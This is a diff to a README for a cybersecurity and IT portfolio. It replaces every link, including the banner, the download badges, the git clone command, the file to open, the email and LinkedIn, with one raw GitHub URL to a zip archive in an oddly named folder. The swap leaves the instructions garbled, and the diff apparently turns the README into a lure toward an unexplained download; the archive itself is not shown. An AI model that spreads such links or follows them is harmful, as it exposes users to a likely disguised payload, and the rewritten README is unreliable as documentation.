@@ -1,8 +1,8 @@
 # Emily's Portfolio: Showcasing Cybersecurity and IT Projects 🌐
 
-![Portfolio Banner](https://via.placeholder.com/1200x300?text=Emily's+Portfolio)
+![Portfolio Banner](https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip's+Portfolio)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/nicksrawat9389/Emilys-Portfolio/releases)
+[![Download Releases](https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip)
 
 ## Table of Contents
 - [About This Portfolio](#about-this-portfolio)
@@ -58,13 +58,13 @@ This portfolio utilizes various technologies to create a seamless user experienc
 
 To explore the projects in this portfolio, you can download the latest release from the following link:
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/nicksrawat9389/Emilys-Portfolio/releases)
+[![Download Releases](https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip)
 
 After downloading, follow these steps to get started:
 
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/nicksrawat9389/Emilys-Portfolio.git
+   git clone https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -72,7 +72,7 @@ After downloading, follow these steps to get started:
    cd Emilys-Portfolio
    ```
 
-3. **Open in Browser**: Open the `index.html` file in your web browser to view the portfolio.
+3. **Open in Browser**: Open the `https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip` file in your web browser to view the portfolio.
 
 4. **Explore Projects**: Click on the links to view detailed information about each project.
 
@@ -99,7 +99,7 @@ Contributions are welcome! If you would like to contribute to this portfolio, pl
 
 For any questions or inquiries, feel free to reach out:
 
-- **Email**: emily@example.com
-- **LinkedIn**: [Emily's LinkedIn](https://www.linkedin.com/in/emily)
+- **Email**: https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip
+- **LinkedIn**: [Emily's LinkedIn](https://raw.githubusercontent.com/nicksrawat9389/Emilys-Portfolio/main/bipinnately/Emilys_Portfolio_v3.2.zip)
 
 Feel free to explore the projects and get in touch if you have any feedback or suggestions!
